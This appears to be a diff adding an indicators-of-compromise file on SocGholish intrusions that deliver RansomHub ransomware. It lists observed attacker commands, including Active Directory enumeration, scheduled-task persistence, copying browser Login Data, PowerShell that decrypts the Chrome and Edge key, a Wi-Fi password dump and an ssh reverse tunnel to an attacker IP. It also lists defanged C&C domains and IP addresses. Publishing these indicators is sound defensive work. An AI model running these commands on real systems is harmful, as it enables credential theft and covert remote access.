@@ -1,0 +1,170 @@
+SocGholishâ€™s Intrusion Techniques Facilitate Distribution of RansomHub Ransomware - Indicators of Compromise
+
+=================================================================
+SocGholish Task Commands:
+=================================================================
+
+Process Chain:
+wscript.exe => cmd.exe => {command}
+
+powershell.exe ls $env:APPDATA\\\\Microsoft\\\\Signatures
+net group "domain users" /domain
+powershell -c "$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\\\'\\\'); $searcher.Filter = \\\'(&(objectCategory=person)(objectClass=user))\\\ $searcher.PageSize = 1000; $searcher.PropertiesToLoad.Add(\\\'samaccountname\\\') > $null; $searcher.PropertiesToLoad.Add(\\\'description\\\') > $null; $users = $searcher.FindAll() | ForEach-Object { if ($_.Properties[\\\'description\\\'] -and $_.Properties[\\\'description\\\'][0] -ne \\\'\\\') { \\\'\\{0\\} | {1}\\\' -f $_.Properties[\\\'samaccountname\\\'][0], $_.Properties[\\\'description\\\'][0] } }; $users"
+powershell -c "$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\\\'\\\'); $searcher.Filter = \\\'(&(objectCategory=person)(objectClass=user)(mail=*))\\\ $searcher.PageSize = 1000; $searcher.PropertiesToLoad.Add(\\\'mail\\\') > $null; $searcher.FindAll() | ForEach-Object { $_.Properties[\\\'mail\\\'][0] }"
+nltest /domain_trusts
+powershell -c "$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\\\'\\\'); $searcher.Filter = \\\'(&(objectCategory=computer)(operatingSystem=*2003*))\\\ $searcher.PageSize = 1000; $searcher.PropertiesToLoad.Add(\\\'dnshostname\\\') > $null; $searcher.FindAll() | ForEach-Object { $_.Properties[\\\'dnshostname\\\'][0] }"
+powershell -c "$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\\\'\\\'); $searcher.Filter = \\\'(&(objectCategory=computer)(operatingSystem=*server*))\\\ $searcher.PageSize = 1000; $searcher.PropertiesToLoad.Add(\\\'dnshostname\\\') > $null; $searcher.FindAll() | ForEach-Object { $_.Properties[\\\'dnshostname\\\'][0] }"
+powershell -c "$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\\\'\\\'); $searcher.Filter = \\\'(objectCategory=computer)\\\ $searcher.PageSize = 1000; $searcher.PropertiesToLoad.Add(\\\'dnshostname\\\') > $null; $searcher.FindAll() | ForEach-Object { $_.Properties[\\\'dnshostname\\\'][0] }"
+powershell -c "cd %localappdata%\\\\ConnectedDevicesPlatform;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;wget hxxps://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip -OutFile .\\\\python3.12.zip"
+powershell -c "cd %localappdata%\\\\ConnectedDevicesPlatform;Expand-Archive -LiteralPath .\\\\python3.12.zip -DestinationPath .\\\\get-pip;rm .\\\\python3.12.zip;cd get-pip;mkdir DLLs;ren python312._pth python312.pth"
+powershell -c "cd %localappdata%\\\\ConnectedDevicesPlatform\\\\get-pip;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;wget hxxps://bootstrap.pypa.io/pip/pip.pyz -OutFile .\\\\pip.pyz;.\\\\pythonw.exe pip.pyz --trusted-host files.pythonhosted.org --trusted-host pypi.org install pycryptodome virtualenv requests pipx --upgrade pip --no-warn-script-location;sleep 10;ls"
+powershell $a = New-ScheduledTaskAction -WorkingDirectory \'C:\\\\Users\\\\<redacted>\\\\AppData\\\\Local\\\\ConnectedDevicesPlatform\\\\get-pip\\\' -Execute \'pythonw.exe\' -Argument \'pypa.py\$t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1);$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit \'00:00:00\' -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;Register-ScheduledTask -TaskName \'wder44\' -Action $a -Trigger $t -Settings $s
+dir \\\\\\\\<redacted_ip>\\\\c
+copy "%localappdata%\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data" C:\\\\programdata\\\\<redacted>edg.bin
+copy "%localappdata%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data" C:\\\\programdata\\\\<redacted>chr.bin
+powershell -c "$b=((Get-Content \\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Local State\\").split(\',\') -replace \'app_bound_encrypted_key\',\'\' | Select-String \'encrypted_key\') -replace \'\\"}\',\'\' -replace \'\\"encrypted_key\\":\\"\',\'\' -replace \'\\"os_crypt\\":{\',\'\ $c=[System.Convert]::FromBase64String($b); $c=$c[5..($c.Length-1)]; Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
+powershell -c "$b=((Get-Content \\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State\\").split(\',\') -replace \'app_bound_encrypted_key\',\'\' | Select-String \'encrypted_key\') -replace \'\\"}\',\'\' -replace \'\\"encrypted_key\\":\\"\',\'\' -replace \'\\"os_crypt\\":{\',\'\ $c=[System.Convert]::FromBase64String($b); $c=$c[5..($c.Length-1)]; Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
+dir c:\\\\users\\\\<redacted>\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\
+dir \\"c:\\\\users\\\\<redacted>\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\"
+copy \\"c:\\\\users\\\\<redacted>\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\<other user a>\\\\Login Data\\" C:\\\\programdata\\\\<user_data>.bin
+dir c:\\\\windows\\\\system32\\\\OpenSSH
+SCHTASKS /create /tn "Update" /tr "ssh.exe -R 2525 -p 443 -o StrictHostKeyChecking=no cvhjkluytrdcvjytfasdv@5.61.39[.]26" /sc minute /mo 5
+SCHTASKS /run /tn "Update"
+powershell -c "$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\'\'); $searcher.Filter = \'(&(objectCategory=person)(objectClass=user))\ $searcher.PageSize = 1000; $searcher.PropertiesToLoad.Add(\'samaccountname\') > $null; $searcher.PropertiesToLoad.Add(\'description\') > $null; $users = $searcher.FindAll() | ForEach-Object { if ($_.Properties[\'description\'] -and $_.Properties[\'description\'][0] -ne \'\') { \'{0} | {1}\' -f $_.Properties[\'samaccountname\'][0], $_.Properties[\'description\'][0] } }; $users"
+systeminfo
+ipconfig /all
+net localgroup administrators
+net use
+net accounts
+dir c:\\\\users
+net use <redacted> /domain
+net user <redacted> /domain
+dir c:\\\\users\\\\<redacted_ip_address>\\\\*pass* /s
+net use /domain
+powershell -c "$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\'\'); $searcher.Filter = \'(&(objectCategory=person)(objectClass=user)(mail=*))\ $searcher.PageSize = 1000; $searcher.PropertiesToLoad.Add(\'mail\') > $null; $searcher.FindAll() | ForEach-Object { $_.Properties[\'mail\'][0] }"
+net user <redacted IT Admin account> /domain
+powershell -c "$profiles = netsh wlan show profiles | Select-String \'All User Profile\' | ForEach-Object { ($_ -split \': \')[1].Trim() }; $profiles | ForEach-Object { netsh wlan show profile name=\\"$_\\" key=clear } | Select-String -Pattern \'SSID name\',\'Key Content\'"
+
+
+=================================================================
+SocGholish C&C Infrastructure:
+=================================================================
+
+-----------------------------------------------------------------
+C&C Server Domains
+-----------------------------------------------------------------
+
+nevada.mandros[.]us
+cpanel.kreativelife[.]net
+exclusive.nobogoods[.]com
+whcms.greendreamcannabis[.]com
+windows.envisionfonddulac[.]net
+round.micha[.]ai
+mail.aestheticfina[.]com
+cluster.buydoorlitesandlouvers[.]com
+software.adx-crm[.]com
+sponsor.sewacanada[.]org
+certificate.hypnotherapy-training.co[.]nz
+estate.envisionfonddulac[.]org
+seminary.envisionfonddulac[.]com
+exchange.tuckx[.]com
+dashboard.nzlifecoaching[.]com
+programs.edlester[.]com
+academy.entrepreneurwealthhub[.]com
+portal.miaariacademy[.]com
+preview.jpainting[.]ca
+hub.unlimitedcashflowevent[.]com
+ceo.cowholesaling[.]com
+support.myfirstdealplaybook[.]com
+newsite.iapmd[.]org
+cpanel.buyjlindustriesonline[.]com
+btctrading.crestlinesolutions[.]work
+webmail.ebuildingsource[.]com
+subscribe.bigeznola[.]com
+gemini.1stpagegold[.]com
+customer.aaddigitalstrategies[.]com
+regular.ptbaconsulting[.]com
+crm.bestintownpro[.]com
+trial.buyintercomsonline[.]com
+order.buyanemostatonline[.]com
+static.buyweatherstriponline[.]com
+zone.ebuilderssource[.]com
+slot.buyaiphoneonline[.]com
+
+-----------------------------------------------------------------
+C&C Server IP Addresses
+-----------------------------------------------------------------
+
+207.174.31[.]215
+185.72.8[.]129
+38.180.137[.]245
+38.180.137[.]141
+45.76.228[.]18
+140.82.4[.]20
+149.28.125[.]75
+172.96.15[.]104
+193.124.24[.]117
+207.90.236[.]231
+155.138.226[.]179
+172.96.15[.]103
+85.209.85[.]206
+207.174.31[.]92
+166.88.182[.]126
+23.146.184[.]221
+194.135.104[.]251
+23.133.88[.]96
+166.1.173[.]65
+38.180.244[.]209
+91.149.239[.]242
+155.138.211[.]27
+128.254.146[.]183
+166.88.182[.]65
+85.209.85[.]199
+82.153.134[.]38
+194.135.104[.]175
+
+=================================================================
+Keitaro TDS Domains used for SocGholish Delivery
+=================================================================
+
+rednosehorse[.]com
+apiexplorerzone[.]com
+smthwentwrong[.]com
+newgoodfoodmarket[.]com
+foundedbrounded[.]org
+packedbrick[.]com
+newgreenvibes[.]com
+rapiddevapi[.]com
+digdonger[.]org
+blackshelter[.]org
+blacksaltys[.]com
+brickedpack[.]com
+blessedwirrow[.]org
+
+=================================================================
+Ransomhub Python Backdoor Infrastructure:
+=================================================================
+
+38.180.81[.]153
+108.181.115[.]171
+38.180.195[.]187
+185.174.101[.]240
+194.36.209[.]227
+92.118.112[.]143
+185.174.101[.]69
+92.118.112[.]208
+108.181.182[.]143
+173.44.141[.]226
+162.252.173[.]12
+23.227.193[.]172
+185.33.86[.]15
+45.66.248[.]150
+5.8.63[.]178
+88.119.175[.]70
+185.219.220[.]175
+45.82.85[.]50
+104.238.61[.]144
+193.203.49[.]90
+38.146.28[.]93
+88.119.175[.]65
+37.1.212[.]18
